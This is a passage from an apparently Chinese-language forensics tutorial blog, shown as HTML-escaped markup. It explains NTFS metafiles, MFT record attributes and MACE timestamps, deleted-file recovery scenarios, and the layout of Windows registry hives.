&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Mft
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $MftMirr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $LogFile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Volume
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Bitmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $BadClus
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $AttrDef
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Secure
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Extend
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   ├── $Quota
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   ├── $ObjId
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   ├── $Reparse
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   └── $UsnJrnl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $UpCase
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Boot
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└── ...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;mft&#34;&gt;$Mft
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MFT，即主文件表，是NTFS文件系统的核心数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它本身是一个特殊文件，由一系列固定大小的文件记录（通常为1024字节）组成&lt;/p&gt;
&lt;p&gt;卷上的每一个文件和目录都至少对应MFT中的一个文件记录，该记录包含一个头部和一系列描述文件所有信息的属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的主要用途是作为整个卷的索引目录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;操作系统进行任何文件操作（如查找、读取、写入、权限检查）时，都必须首先查询$Mft以获取文件的元数据，包括时间戳、大小、权限以及数据在磁盘上的物理位置&lt;/p&gt;
&lt;p&gt;我们后面会详细说明它：[MFT](#NTFS的关键结构 —— 主文件表MFT)&lt;/p&gt;
&lt;h3 id=&#34;mftmirr&#34;&gt;$MftMirr
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MftMirr是主文件表的一个部分备份或镜像&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它通常只包含Mft最开头的几个关键文件记录（例如描述Mft自身、LogFile等元文件的记录）&lt;/p&gt;
&lt;p&gt;为了提高容灾能力，它在物理磁盘上的存储位置通常远离Mft&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其唯一的用途是文件系统恢复&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当Mft文件的起始部分发生损坏导致文件系统无法挂载时，操作系统可以利用MftMirr来定位关键的元文件，从而为修复工具提供恢复文件系统的可能性&lt;/p&gt;
&lt;h3 id=&#34;logfile&#34;&gt;$LogFile
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;该文件是NTFS日志记录功能的物理载体&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它遵循预写式日志模型，即在对文件系统元数据进行任何实际更改之前，都会先将描述该操作的事务日志记录写入LogFile&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的核心用途是保证文件系统的一致性和可恢复性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在系统意外崩溃或断电后，NTFS驱动程序可以通过检查LogFile，回滚未完成的事务或完成已记录但未写入的事务，从而防止文件系统结构损坏，也可以用来恢复最近的文件操作历史&lt;/p&gt;
&lt;h3 id=&#34;volume&#34;&gt;$Volume
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是一个存储卷级别信息的元文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它的主要属性中包含了整个卷的元数据，例如卷标、NTFS版本号以及卷的状态标志位&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;操作系统使用此文件来识别卷的属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其中脏位(Dirty Bit)尤为重要，表示某个数据结构或内存页是否已经被修改过但尚未写回到磁盘或永久存储中，系统在启动时会检查这个标志，如果发现上次关机是“非正常”的，就会触发chkdsk等磁盘检查工具来确保卷的一致性&lt;/p&gt;
&lt;h3 id=&#34;bitmap&#34;&gt;$Bitmap
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bitmap是一个位图文件&lt;/strong&gt;，它的每一个比特位都精确地对应着卷上的一个物理簇&lt;/p&gt;
&lt;p&gt;比特位的值（0或1）用于标记其对应的簇是空闲的还是已被占用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它被文件系统用于高效地管理磁盘空间分配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当需要为新文件写入数据时，系统会查询Bitmap来快速找到连续的空闲簇&lt;/p&gt;
&lt;p&gt;当文件被删除时，其占用的簇对应的比特位会被重置为0（空闲）&lt;/p&gt;
&lt;h3 id=&#34;badclus&#34;&gt;$BadClus
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;该文件标记了卷上所有已被检测为物理损坏或不可靠的坏簇&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它以一个稀疏文件的形式存在，其$DATA属性中包含了所有坏簇的位置列表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的作用是防止数据丢失&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;文件系统在分配磁盘空间时，会避开BadClus文件中标记的所有簇，以确保用户数据不会被写入到这些已知的物理损坏区域&lt;/p&gt;
&lt;h3 id=&#34;attrdef&#34;&gt;$AttrDef
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AttrDef是属性定义表，相当于MFT文件记录的模式或模板定义文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它以结构化的形式，列出了NTFS文件系统支持的所有属性类型及其元数据，包括它们的名称、数字ID以及默认特性（如是否可以非常驻）&lt;/p&gt;
&lt;p&gt;此文件由NTFS驱动程序在内部使用，用于在解析任何MFT文件记录时，都能正确地识别和解释其中的各种属性结构，保证了MFT的结构完整性和可扩展性&lt;/p&gt;
&lt;h3 id=&#34;secure&#34;&gt;$Secure
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是一个集中存储卷上所有文件和目录的安全描述符的数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NTFS为了节省空间，并不会在每个MFT记录中都存一份完整的安全描述符（包含用户SID、权限ACL等），而是将唯一的描述符存储在Secure文件中，并赋予其一个ID&lt;/p&gt;
&lt;p&gt;其他MFT记录只需引用这个ID即可&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要用途是提高权限验证效率和降低安全信息的存储冗余&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过共享安全描述符，可以显著减小MFT的体积，并允许系统更高效地缓存和查询权限信息&lt;/p&gt;
&lt;h3 id=&#34;extend&#34;&gt;$Extend
&lt;/h3&gt;&lt;p&gt;Extend本身是一个目录，它作为NTFS高级功能模块的扩展容器，其下包含了多个用于支持特定功能的元文件&lt;/p&gt;
&lt;p&gt;它为磁盘配额、对象ID、重解析点和变更日志等高级功能提供结构化的存储位置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它包含以下重要子文件：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;quota&#34;&gt;$Quota
&lt;/h4&gt;&lt;p&gt;用于记录和管理每个用户在该卷上的磁盘空间使用限制&lt;/p&gt;
&lt;p&gt;它以包含用户SID、空间使用量、警告阈值和硬限制等信息的结构化记录进行存储&lt;/p&gt;
&lt;p&gt;实现Windows的磁盘配额功能，允许管理员为不同用户设置不同的磁盘空间上限&lt;/p&gt;
&lt;h4 id=&#34;objid&#34;&gt;$ObjId
&lt;/h4&gt;&lt;p&gt;为一个卷上的每个文件分配一个全局唯一的对象标识符（GUID），以便快速查找&lt;/p&gt;
&lt;p&gt;主要被分布式链接跟踪等系统服务使用，确保即使用户将文件移动或重命名，依赖该文件的快捷方式等依然能找到它&lt;/p&gt;
&lt;h4 id=&#34;reparse&#34;&gt;$Reparse
&lt;/h4&gt;&lt;p&gt;记录了卷上所有设置了重解析点的文件或目录&lt;/p&gt;
&lt;p&gt;重解析点允许一个文件或目录的访问被一个特定的驱动程序拦截并进行特殊处理&lt;/p&gt;
&lt;p&gt;它是实现多种高级文件系统功能的基础，例如符号链接、目录联接、卷挂载点以及OneDrive的占位符文件等&lt;/p&gt;
&lt;h4 id=&#34;usnjrnl&#34;&gt;$UsnJrnl
&lt;/h4&gt;&lt;p&gt;其全称为Update Sequence Number Journal，即更新序列号日志&lt;/p&gt;
&lt;p&gt;它是一个高效率的日志，记录了卷上所有文件的所有变更事件，如创建、删除、写入、重命名、权限修改等&lt;/p&gt;
&lt;p&gt;它的主要用户是需要监控文件系统变化的应用程序，如增量备份软件、文件同步服务、以及安全审计工具。在取证分析中，它是还原文件详细活动历史的最重要数据源之一&lt;/p&gt;
&lt;h3 id=&#34;boot&#34;&gt;$Boot
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;该文件是卷的引导扇区的一个精确副本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它包含了BIOS参数块，详细描述了该分区的物理布局，以及用于启动操作系统的初始引导代码&lt;/p&gt;
&lt;p&gt;其核心用途是在计算机启动时，由BIOS/UEFI读取并执行，以&lt;strong&gt;加载操作系统的引导加载程序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同时，NTFS驱动程序也需要读取它来理解卷的几何结构&lt;/p&gt;
&lt;h3 id=&#34;upcase&#34;&gt;$UpCase
&lt;/h3&gt;&lt;p&gt;该文件包含了一个完整的、将所有Unicode字符映射到其对应大写形式的转换表，&lt;strong&gt;用于实现NTFS文件名大小写不敏感但大小写保留的特性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当进行文件名比较或查找时，文件系统会调用这个映射表来确保&lt;code&gt;file.txt&lt;/code&gt;和&lt;code&gt;FILE.TXT&lt;/code&gt;这样的大小写被视为同一个文件&lt;/p&gt;
&lt;h3 id=&#34;recyclebin&#34;&gt;$Recycle.Bin
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这虽然不是一个元数据文件，但它是一个与文件系统紧密相关的、重要的系统隐藏目录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当用户通过图形界面删除文件时，文件并不会被物理删除，而是其MFT记录被修改，使其被移动到Recycle.Bin目录下某个以用户SID命名的子目录中，并被重命名，同时一个索引文件会记录下原始的文件名和路径&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它为用户提供回收站功能，允许恢复被误删除的文件&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;ntfs的关键结构--主文件表mft&#34;&gt;NTFS的关键结构 —— 主文件表MFT
&lt;/h2&gt;&lt;h3 id=&#34;什么是mft&#34;&gt;什么是MFT
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MFT的全称是MasterFileTable ，即主文件表，它是NTFS文件系统的核心&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果NTFS格式的硬盘分区是图书馆，那么MFT就是这个图书馆的总目录卡片索引柜&lt;/p&gt;
&lt;p&gt;这个索引柜本身也是一个特殊的文件，名为&lt;code&gt;$MFT&lt;/code&gt;，里面存放着一张张的卡片，每一张卡片都详细记录了图书馆里某一本书（即硬盘上的一个文件或文件夹）的所有信息&lt;/p&gt;
&lt;p&gt;没有这个总目录，操作系统就无法找到、访问或管理分区上的任何文件&lt;/p&gt;
&lt;h3 id=&#34;mft-的结构&#34;&gt;MFT 的结构
&lt;/h3&gt;&lt;h4 id=&#34;文件记录&#34;&gt;文件记录
&lt;/h4&gt;&lt;p&gt;MFT 由一系列固定大小的文件记录构成，每个记录都有一个唯一的编号，从 0 开始&lt;/p&gt;
&lt;p&gt;记录的前部是固定的头结构&lt;code&gt;FILE_RECORD_SEGMENT_HEADER&lt;/code&gt;，用于描述该记录的状态（如是否在使用中）&lt;/p&gt;
&lt;p&gt;其余部分则由多个可变长度的属性组成&lt;/p&gt;
&lt;h4 id=&#34;核心属性&#34;&gt;核心属性
&lt;/h4&gt;&lt;p&gt;每个文件记录内部，由多个不同类型的属性来完整描述一个文件，下面介绍几个关键属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$STANDARD_INFORMATION (0x10)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是存储文件的核心元数据，包括安全描述符、所有者ID，以及一组MACE时间戳&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这组时间戳与文件内容的改变紧密相关，被认为是最稳定的时间戳，其创建时间通常反映了文件数据首次被写入的时间，是构建原始时间线的基准，常被称为MAC(B)时间&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;1. M - Modified (修改时间) —— 文件内容最后一次被修改的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当打开一个文件，编辑其内容并保存后，这个时间戳就会更新&lt;/p&gt;
&lt;p&gt;创建新文件时，它的修改时间与创建时间相同&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;2. A - Accessed (访问时间) —— 文件内容最后一次被访问读取的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;理论上，只要一个程序打开并读取了文件内容（即使没有修改），这个时间戳就应该更新。&lt;/p&gt;
&lt;p&gt;但是在现代Windows系统中（Vista及之后），为了提高性能，默认情况下访问时间的更新是禁用的，因此这个时间戳的参考价值有限，除非管理员手动开启了该功能&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;3. C - Created (创建时间) —— 文件被创建在这个文件系统上的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当一个文件从一个地方&lt;strong&gt;复制&lt;/strong&gt;到另一个地方时，新文件的“创建时间”是复制操作发生的时间，而不是原始文件的创建时间&lt;/p&gt;
&lt;p&gt;但当文件被&lt;strong&gt;移动到同一卷&lt;/strong&gt;（例如从C盘的一个文件夹移动到另一个文件夹）时，创建时间通常不会改变&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;4. E - Entry Modified (MFT记录变更时间) —— 该文件在MFT中的记录本身最后一次被修改的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;任何导致文件元数据发生变化的操作都会更新这个时间戳，例如文件重命名、文件大小改变、权限修改等。当然，修改文件内容（更新Modified时间）也同样会更新这个时间戳&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$FILE_NAME (0x30)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;包括存储文件名、父目录的文件记录号、文件大小，以及&lt;strong&gt;另一组独立的MACE时间戳&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这组时间戳反映的是文件名属性本身的状态&lt;/strong&gt;，当文件被创建、移动或重命名时，这组时间戳会被更新&lt;/p&gt;
&lt;p&gt;通过对比&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;和&lt;code&gt;$FILE_NAME&lt;/code&gt;两组时间戳的差异，可以用来判断文件是原地创建还是从别处复制而来&lt;/p&gt;
&lt;p&gt;一个文件记录可以有多个&lt;code&gt;$FILE_NAME&lt;/code&gt;属性，以支持长文件名、MS-DOS兼容的8.3短文件名与硬链接&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;这两组时间具体变化情况如下表(访问时间在现代Windows系统中默认禁用更新，因此假设其始终不变)：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;操作&lt;/th&gt;
          &lt;th&gt;属性&lt;/th&gt;
          &lt;th&gt;创建时间  (C)&lt;/th&gt;
          &lt;th&gt;修改时间 (M)&lt;/th&gt;
          &lt;th&gt;访问时间 (A)&lt;/th&gt;
          &lt;th&gt;MFT变更时间 (E)&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;原地创建文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;修改文件内容&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;复制文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌ (继承)&lt;/td&gt;
          &lt;td&gt;❌ (继承)&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;移动文件 (同一分区)&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;重命名文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;读取文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$DATA&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其中存储着文件的实际数据，其存储方式有两种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;常驻数据（存内容）&lt;/strong&gt;：如果文件非常小（通常小于约700字节），其全部数据会直接存储在 MFT 记录内部的&lt;code&gt;$DATA&lt;/code&gt;属性中，无需到磁盘的其他地方去寻找&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;非常驻数据（存指针）&lt;/strong&gt;：如果文件较大，&lt;code&gt;$DATA&lt;/code&gt;属性中存储的则是数据运行/簇列表，这是一系列指针，详细描述了该文件的数据流在磁盘上占用了哪些不连续的簇&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$ATTRIBUTE_LIST&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它包含一个指针列表，指向存储该文件其他属性的额外MFT记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当一个文件的所有属性无法在一个MFT记录中存下时（例如，文件有极多的硬链接或高度碎片化），系统会创建这个属性&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;mft与文件恢复&#34;&gt;MFT与文件恢复
&lt;/h4&gt;&lt;p&gt;当一个文件被删除时，NTFS的操作是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在 MFT 中找到该文件对应的记录，并将其头部的&lt;code&gt;in-use&lt;/code&gt;标志位置为0（未使用），记录本身的内容并不会被立即清除&lt;/li&gt;
&lt;li&gt;在&lt;code&gt;$Bitmap&lt;/code&gt;文件中（跟踪卷上所有簇使用情况的元文件），将该文件数据所占用的磁盘簇标记为未分配&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种标记删除机制使得数据恢复成为可能，恢复的成功率取决于MFT记录和原始数据簇是否被后续写入的新文件所覆盖&lt;/p&gt;
&lt;p&gt;这就导致下面几种情况：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;恢复场景&lt;/th&gt;
          &lt;th&gt;MFT记录状态&lt;/th&gt;
          &lt;th&gt;文件数据状态&lt;/th&gt;
          &lt;th&gt;可恢复性&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;最佳情况&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完美恢复&lt;/strong&gt;：文件名、元数据和文件内容全部可以恢复&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;一般情况&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;部分被覆盖&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;部分恢复&lt;/strong&gt;：文件名和元数据可恢复，但文件内容不完整或已损坏&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;情况三&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完全被覆盖&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;仅元数据恢复&lt;/strong&gt;：只能恢复文件名、大小、时间戳等“档案”信息，文件内容永久丢失&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;最差情况&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;被覆盖&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好或部分完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;部分恢复&lt;/strong&gt;：文件名和元数据永久丢失，但文件内容本身可以从磁盘的“未分配空间”中被恢复出来&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;常驻数据&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;数据在MFT记录中&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完美恢复&lt;/strong&gt;：由于文件数据本身就存储在MFT记录中，只要MFT记录未被覆盖，即使磁盘数据区被重写，文件内容依然可以被完整恢复&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;注册表&#34;&gt;注册表
&lt;/h1&gt;&lt;h2 id=&#34;什么是注册表&#34;&gt;什么是注册表
&lt;/h2&gt;&lt;p&gt;Windows注册表是整个操作系统的核心数据库，是一个庞大、复杂的层级式数据库&lt;/p&gt;
&lt;p&gt;它存储了操作系统和几乎所有应用程序运行所需的全部配置信息，从硬件驱动的设置、软件的安装路径，到桌面壁纸的图片位置，所有的一切都记录在其中&lt;/p&gt;
&lt;h2 id=&#34;如何打开注册表&#34;&gt;如何打开注册表
&lt;/h2&gt;&lt;p&gt;我们可以使用注册表编辑器：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win+R打开运行窗口，输入regedit，Shift+Ctrl+Enter以管理员模式打开&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;除了直接看注册表，它还有一个简单易用的用户界面——本地组策略，只不过家庭版通常是没有的：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win+R打开运行窗口，输入gpedit.msc打开&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;注册表的结构&#34;&gt;注册表的结构
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;要分析注册表，我们必须理解它的双层结构：物理层和逻辑层&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;注册表的配置单元物理层---hive&#34;&gt;注册表的配置单元（物理层 - HIVE）
&lt;/h3&gt;&lt;p&gt;在Windows9x中，注册表文件的数据信息保存在system.dat（系统）和user.dat（用户）中&lt;/p&gt;
&lt;p&gt;但到了WindowsNT，注册表并不是一个单一的大文件，而是由一组名为配置单元 (Hive)的独立文件组成的&lt;/p&gt;
&lt;p&gt;这些是存储在硬盘上的真实文件，在系统运行时被加载到内存中，下面是几个常见的：&lt;/p&gt;
&lt;h4 id=&#34;system&#34;&gt;SYSTEM
&lt;/h4&gt;&lt;p&gt;存储核心的系统硬件配置、服务列表、启动设置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SYSTEM&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;software&#34;&gt;SOFTWARE
&lt;/h4&gt;&lt;p&gt;存储操作系统和已安装软件的全局配置信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SOFTWARE&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;sam&#34;&gt;SAM
&lt;/h4&gt;&lt;p&gt;安全帐户管理器(Security Account Manager)，存储本地用户的账户信息和密码哈希&lt;/p&gt;
